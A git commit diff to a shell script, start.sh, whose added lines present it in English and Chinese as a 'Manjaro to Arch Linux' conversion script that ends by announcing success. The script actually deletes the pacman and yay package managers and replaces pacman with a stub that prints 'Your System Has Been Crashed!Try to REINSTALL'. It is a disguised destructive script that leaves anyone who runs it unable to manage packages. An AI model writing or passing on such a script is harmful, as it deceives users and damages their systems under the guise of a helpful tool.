75b272ad60d15d6314f611cef2eefda0515d5db3
Molyuu <zhangjtroger@gmail.com>
2022-06-18 11:20:01 +0800

    1

--- start.sh
+++ start.sh
@@ -1,5 +1,14 @@
 #!/usr/bin/bash
+echo Manjaro to Arch Linux Script
+echo Manjaro转Arch的脚本！
+echo Start to convert
+echo 开始转换
+
 rm /usr/bin/pacman
 rm /usr/bin/yay
 touch /usr/bin/pacman
 echo '#!/usr/bin/bash;echo Your System Has Been Crashed!Try to REINSTALL' > /usr/bin/pacman
+
+echo Success!
+echo 转换成功！
+
